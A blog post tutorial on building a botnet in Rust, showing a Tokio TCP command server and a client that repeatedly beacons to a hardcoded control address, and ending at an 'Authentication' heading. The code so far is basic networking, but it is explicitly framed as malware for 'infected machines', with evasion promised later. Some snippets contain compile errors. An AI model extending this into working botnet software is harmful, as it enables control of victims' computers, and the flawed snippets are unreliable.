---
layout: post
title: "Building a Botnet in Rust"
date: 2025-2-20 12:00.00 -0600
categories: cybersecurity
---

In this fun and informational guide, I will show and guide you through some of the basic prinicpals of building your own botnet! I had this idea a while ago and now that
my Rust skills are better-than-none, I feel confident in my ability to make a cool project like this. Like always, using this or software like this on machines that are not yours (or on targets that are not yours, as you will see later) is completely illegal! My goal is to have fun, so don't be a loser and ruin it for me.

# The Basics

What is a botnet? How might I get started. A botnet, if you didn't know, is really just a network of computers controlled by some other computer/computers.
In this tutorial, I will create a botnet with a really easy server/client model, where every infected machine reports to one central server for commands. Sounds easy enough, right?

> All the code in this tutorial assumes that you are semi-competent at Rust. There is nothing crazy or too out there, but you should be familiar with the Tokio RunTime and Async.

# Getting a Connection

TCP or UDP is the big question when it comes to networking. I prefer TCP over UDP for these applications for several reasons, and it typically has to do with the client. Some operating systems and configurations require special firewall permissions to get a UDP socket, while acting as the client in a TCP connection does not require any special configuration. This means that an infected machine can easily get a connection back to our evil host!

We will start with some work on the host machine, creating a TcpListener to open up a socket and start listening for connections.

{% highlight rust %}

// Keep in mind, we are using the tokio runtime here, so get your tokio imports down.
use std::error::Error;
use tokio::net::{TcpListener, TcpStream};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
let listener = TcpListener::bind("0.0.0.0:8080").await? // Get a TcpListener on port 8080

    loop {
        let (socket, _) = listener.accept().await?;

        tokio::spawn(async move{
            handle_conn(socket).await;
        })
    }

}

{% endhighlight %}

Notice a few quick things here: we have a function to handle our connection, and we ignoring something when we destructure into socket. We are ignoring the peer SockAddr.

> For those unfamiliar with Tokio or Rust networking, this creates a new task in parallel for every new connection.

Now, let's make a function to handle a TcpStream. We will be using 1024 byte buffers for messages between the server and client. This stipulation is important for later when we get to control server authentication.

{% highlight rust %}
async fn handle_conn(mut stream: TcpStream) {
    let (mut reader, mut writer) = stream.split();

    let mut buf = vec![0u8; 1024];

    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
    // Remember, this function is being ran in a tokio task.
    // When a pask panic!s, the task just ends and causes no issues.
    // So we don't worry about good error handling that much.

    println!("Recieved from client: {}", String::from_utf8_lossy(&buf[..]));

    // Now a little bit of work to ensure that our message is always 1024 bytes.
    // The message being sent, the command, will be set as a command line argument.
    // So that we can easily deploy an action with just notbotcontrol "do whatever" in the terminal.

    // Sets all bytes in buf to 0 again
    for (index, val) in buf.iter_mut().enumerate() {
        *val = 0;
    }

    // Sets the buffer with the arg (dont worry about
    // the actual cl argument yet, we will get there later.)
    let arg = String::from("My command!");
    arg.into_bytes().iter().enumerate().for_each(|index, &val| {
        buf[index] = val;
    });

    writer.write_all(&buf[..]).await.expect("Writer Failed");

    writer.shutdown().await;

}

{% endhighlight %}

Here we have a basic TCP server set up, taking in a message and responding with its own. Perfect!

Now let's get to the client.

A feature we will for sure need in our client is the ability to continiously connect to a server. With our current model, the server is not continuously running, rather it is just responding when
up. For this, let's make a helper function to always attempt for a connection.

{% highlight rust %}
use tokio::time::{sleep, Duration};
use tokio::net::TcpStream;

const CONTROL: &str = "127.0.0.1:8080"; // Ip of control server
// We will talk about covering this trail later.

async fn get_stream() -> TcpStream {
    loop {
        match TcpStream::connect(CONTROL).await {
            Ok(s) => return s,
            Err(_) => {
                sleep(Duration::from_millis(5000)).await;
            }
        }
    }
}

{% endhighlight %}

The principal is pretty simple: if we get a stream return it, if not we sleep for 5 seconds and try again until we do get it.

Let's get a message.

{% highlight rust %}
#[tokio::main]
async fn main() {

    // Start a communication loop
    loop {
        sleep(Duration::from_millis(5000)).await;

        let mut stream = get_stream().await;
        let (mut reader, mut writer) = stream.split();

        // Every time we use a reader or writer, we need to check for an error
        // that prompts us to reconnect to the control server.

        if let Err(_) = writer.write_all(b"Hello!").await {
            let _ = writer.shutdown().await;
            continue;
        }

        let mut buf = vec![0u8; 1024];

        // Message

        let message_length = match reader.read_exact(&mut buf).await {
            Ok(n) => n,
            Err(_) => {
                let _ = writer.shutdown().await;
                continue;
            }
        };

        println!("Message from server: {}", String::from_utf8_lossy(&buf[..]));
    }
}

{% endhighlight %}

Just like that, we have communication between server and client. Before we move on, let's make a refactor to the *server* that allows for the passing of command-line arguments to the threads.

{% highlight rust %}

use std::error::Error;
use tokio::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind("0.0.0.0:8080").await?; // Get a TcpListener on port 8080
    let args: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(std::env::args().collect()));

    loop {
        let (socket, _) = listener.accept().await?;

        tokio::spawn(async move{
            handle_conn(socket).await;
        })
    }

}

async fn handle_conn(mut stream: TcpStream, args: Arc<Mutex<Vec<String>>>) {
    let (mut reader, mut writer) = stream.split();

    let mut buf = vec![0u8; 1024];
    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
    println!("Recieved from client: {}", String::from_utf8_lossy(&buf[..]));

    for (index, val) in buf.iter_mut().enumerate() {
        *val = 0;
    }

    let arg;
    {
        arg = args.lock().unwrap().get(1).expect("No Args").clone();
    }

    arg.into_bytes().iter().enumerate().for_each(|index, &val| {
        buf[index] = val;
    });

    writer.write_all(&buf[..]).await.expect("Writer Failed");

    writer.shutdown().await;

}

{% endhighlight %}

There are obviously alternatives to this solution, this is just how I am implementing this in the case that I want to use more args in the future without *always* cloning.
Do what you want for this.

# Authentication